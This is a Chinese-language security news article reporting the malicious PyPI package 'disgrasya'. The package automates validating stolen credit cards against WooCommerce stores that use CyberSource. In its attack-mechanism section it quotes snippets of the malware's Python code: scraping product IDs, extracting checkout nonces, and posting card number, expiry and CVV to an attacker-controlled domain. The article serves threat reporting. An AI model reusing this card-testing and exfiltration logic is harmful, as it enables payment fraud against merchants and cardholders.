---
title: 恶意 Python 包 disgrasya 利用全自动盗刷脚本威胁 WooCommerce 电商安全
url: https://www.anquanke.com/post/id/306247
source: 安全客-有思想的安全新媒体
date: 2025-04-08
fetch_date: 2025-10-06T22:02:43.663466
---

# 恶意 Python 包 disgrasya 利用全自动盗刷脚本威胁 WooCommerce 电商安全

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# 恶意 Python 包 disgrasya 利用全自动盗刷脚本威胁 WooCommerce 电商安全

阅读量**51586**

发布时间 : 2025-04-07 14:20:36

**x**

##### 译文声明

本文是翻译文章，文章原作者 Tushar Subhra Dutta，文章来源：cybersecuritynews

原文地址：<https://cybersecuritynews.com/malicious-pypi-package-with-fully-automated-carding-script/>

译文仅供参考，具体内容表达以及含义原文为准。

在 Python 仓库中，发现了一个复杂的恶意 Python 包 “disgrasya”，它包含一个专门针对 WooCommerce 商店的全自动信用卡盗刷脚本。

这个包名在菲律宾俚语中意为 “灾难”，攻击者利用它无需太多专业技术，就能在真实的电子商务支付系统中测试被盗的信用卡信息。

恶意代码通过模拟合法顾客结账行为发起隐秘攻击，这让欺诈检测系统极难识别和拦截。

与典型的利用域名仿冒或欺骗性命名的供应链攻击不同，“disgrasya” 并未试图掩盖其恶意本质。相反，它公然成为欺诈者验证被盗信用卡信息的传播工具。

该恶意包专门针对使用 WooCommerce 并以 CyberSource 作为支付网关的商家，为这些广泛使用的电子商务系统制造了特定的攻击途径。

Socket.dev 的研究人员发现，在被发现之前，这个包的下载量已超过 34860 次，这表明它在潜在攻击者中分布广泛。

恶意负载最早出现在 7.36.9 版本，后续所有版本都包含相同的嵌入式攻击逻辑。如此高的下载量意味着该工具可能已在众多欺诈活动中被广泛使用。

由这个包引发的信用卡盗刷攻击，对企业构成了日益严重的财务威胁。行业研究估计，2023 年至 2028 年间，全球在线支付欺诈将使商家损失超过 3620 亿美元，年度损失从 2023 年的 380 亿美元几乎翻倍，到 2028 年达到 910 亿美元，增长了 140%。

### ****攻击机制：多阶段结账模拟****

恶意软件通过精心策划的多阶段流程运作，旨在模仿合法顾客行为的同时验证被盗的信用卡信息。

起初，脚本通过简单的 GET 请求和 HTML 解析提取产品 ID，以此在目标 WooCommerce 商店中识别商品：

url = f”https://{domain}/?=&post\_type=product”

response = session.get(url, proxies=proxy)

split\_text = response.text.split(‘data-product\_id=”‘)id = split\_text[1].split(‘”‘)[0]

识别商品后，脚本通过 WooCommerce 的 AJAX 端点将其添加到购物车，模拟标准购物流程。

然后，它从结账页面提取关键安全令牌 —— CSRF 随机数和 CyberSource capture\_context，这些对于处理合法支付至关重要：

url = f”https://{domain}/checkout/”

response = session.get(url, proxies=proxy)

checkoutNonce = response.text.split(‘name=”woocommerce-process-checkout-nonce” value=”‘)[1].split(‘”‘)

capture\_context = response.text.split(‘”capture\_context”:”‘)[1].split(‘”‘)[0]

最令人担忧的是，被盗的信用卡数据会被泄露到攻击者控制的服务器（railgunmisaka.com），在提交到支付网关之前，这些数据会被进行令牌化处理：

url = “https://www.railgunmisaka.com/cybersourceFlexV2”

headers = {

“Accept”: “application/json”,

“Content-Type”: “application/json”}

data = {

“card”: f”{cc}|{mm}|{yy}|{cvv}”,

“capture\_context”: capture\_context}

这种攻击之所以特别危险，是因为它完美模拟了合法的结账行为。从浏览商品到完成支付的每一个动作，都遵循正常用户模式，极少触发欺诈检测系统。脚本甚至会使用随机生成的顾客信息，并妥善处理成功和失败的交易，这使得检测异常困难。

虽然这个特定的包已从 PyPI 中移除，但相关技术依然可行，可能会以不同的包名再次出现。这凸显了对 Python 包仓库和电子商务结账系统加强安全监控的必要性。

本文翻译自cybersecuritynews [原文链接](https://cybersecuritynews.com/malicious-pypi-package-with-fully-automated-carding-script/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由**安全客**原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： [https://www.anquanke.com/post/id/306247](/post/id/306247)

安全KER - 有思想的安全新媒体

本文转载自: [cybersecuritynews](https://cybersecuritynews.com/malicious-pypi-package-with-fully-automated-carding-script/)

如若转载,请注明出处： <https://cybersecuritynews.com/malicious-pypi-package-with-fully-automated-carding-script/>

安全KER - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [网络攻击](/tag/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB)

**+1**3赞

收藏

![](https://p1.ssl.qhimg.com/t010857340ce46bb672.jpg)安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## 发表评论

您还未登录，请先登录。

[登录](/login/index.html)

![](https://p5.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p1.ssl.qhimg.com/t010857340ce46bb672.jpg)](/member.html?memberId=175868)

[安全客](/member.html?memberId=175868)

这个人太懒了，签名都懒得写一个

* 文章
* **376**

* 粉丝
* **1**

### TA的文章

* ##### [mavinject.exe 遭利用，黑客绕过安全防线入侵系统](/post/id/306961)

  2025-04-28 10:48:18
* ##### [Docker 惊现新型加密挖矿攻击，借 Teneo 平台开辟恶意获利新路径](/post/id/306959)

  2025-04-28 10:39:59
* ##### [Cloudflare 隧道遭滥用，恶意 RAT 传播威胁加剧](/post/id/306957)

  2025-04-28 10:34:35
* ##### [xrpl.js 库遭供应链攻击，超 290 万次下载用户私钥成窃取目标](/post/id/306953)

  2025-04-28 10:29:02
* ##### [恶意后门借 ViPNet 更新渗透，俄罗斯多行业数据安全拉响警报](/post/id/306951)

  2025-04-28 10:22:13

### 相关文章

* ##### [Morte僵尸网络被披露：正利用路由器与企业应用漏洞，迅速扩张其“加载器即服务”活动](/post/id/312444)

  2025-09-29 18:04:01
* ##### [Akira勒索软件利用SonicWall VPN账户发起急速入侵](/post/id/312438)

  2025-09-29 18:03:28
* ##### [DarkCloud信息窃取器现新变种：采用VB6混淆技术并新增加密货币钱包窃取功能，威胁显著升级](/post/id/312435)

  2025-09-29 18:02:53
* ##### [TamperedChef恶意软件兴起：欺诈应用利用经过签名的二进制文件与搜索引擎投毒劫持浏览器](/post/id/312432)

  2025-09-29 18:02:25
* ##### [黑客将SVG文件武器化，用于隐秘投递恶意负载](/post/id/312351)

  2025-09-24 16:44:10
* ##### [ShadowV2僵尸网络利用配置错误的AWS Docker容器构建DDoS攻击租用服务](/post/id/312381)

  2025-09-24 16:40:43
* ##### [npm软件包“fezbox”中被发现新型恶意软件，可利用二维码窃取用户凭据](/post/id/312387)

  2025-09-24 16:40:06

### 热门推荐

文章目录

![](https://p0.qhimg.com/t11098f6bcd5614af4bf21ef9b5.png)

安全KER

* [关于我们](/about)
* [联系我们](/note/contact)
* [用户协议](/note/protocol)
* [隐私协议](/note/privacy)

商务合作

* [合作内容](/note/business)
* [联系方式](/note/contact)
* [友情链接](/link)

内容需知

* [投稿须知](https://www.anquanke.com/contribute/tips)
* [转载须知](/note/repost)
* 官网QQ群：568681302

合作单位

* [![安全KER](https://p0.ssl.qhimg.com/t01592a959354157bc0.png)](http://www.cert.org.cn/)
* [![安全KER](https://p0.ssl.qhimg.com/t014f76fcea94035e47.png)](http://www.cnnvd.org.cn/)

Copyright © 北京奇虎科技有限公司 三六零数字安全科技集团有限公司 安全KER All Rights Reserved [京ICP备08010314号-66](https://beian.miit.gov.cn/)[![](https://icon.cnzz.com/img/pic.gif)](https://www.cnzz.com/stat/website.php?web_id=1271278035 "站长统计")

微信二维码

**X**![安全KER](https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg)